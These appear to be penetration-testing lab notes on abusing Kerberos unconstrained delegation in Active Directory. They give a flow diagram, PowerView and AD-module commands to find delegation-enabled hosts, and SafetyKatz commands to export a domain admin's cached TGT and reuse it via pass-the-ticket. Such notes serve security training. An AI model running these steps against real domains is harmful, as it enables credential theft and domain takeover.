

* It allows delegation to any service to any resource on the domain as a user.
* When unconstrained delegation is enabled, the DC places user's TGT inside TGS. On the first hop, the TGT is extracted from TGS and stored in LSASS. This way the server can reuse the user's TGT to access any other resource as the user.
* This is  best for abuse!

#  Overview of the Process :

```
###############################################################################
#                    PRIV ESC - UNCONSTRAINED DELEGATION                      #
###############################################################################


          +------------+            (7)            +------------+
          | WEB SERVER |-------------------------->|  DATABASE  |
          +------------+                           |   SERVER   |
            ^        |                             +------------+
           /         |
         (5)        (6)
         /           |
        /            v
 +--------+      +------------+
 |  USER  | <===>|     DC     |
 +--------+ (1-4)+------------+


-------------------------------------------------------------------------------
PROCESS FLOW:
-------------------------------------------------------------------------------
1. User provides credentials to the Domain Controller (DC).
2. The DC returns a Ticket Granting Ticket (TGT).
3. The user requests a Service Ticket (TGS) for the web service on Web Server.
4. The DC provides the TGS.
5. The user sends their TGT and TGS to the Web Server.
6. The Web Server service account uses the user's TGT to request a TGS 
   for the Database Server from the DC.
7. The Web Server service account connects to the Database Server 
   acting as the user.
-------------------------------------------------------------------------------
```


* Discover domain computers which have unconstrained delegation enabled using PowerView:
```
Get-DomainComputer -UnConstrained
```

* Using ActiveDirectory module:
```
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
```

```
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

* Compromise the server(s) where Unconstrained delegation is enabled.
* We must trick or wait for a domain admin to connect a service on appsrv.
* Now, if the command is run again:
```
SafetyKatz.exe "sekurlsa::tickets /export"
```

* The DA token could be reused:
```
Safetykatz.exe "kerberos::ptt
```

```
C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"
```

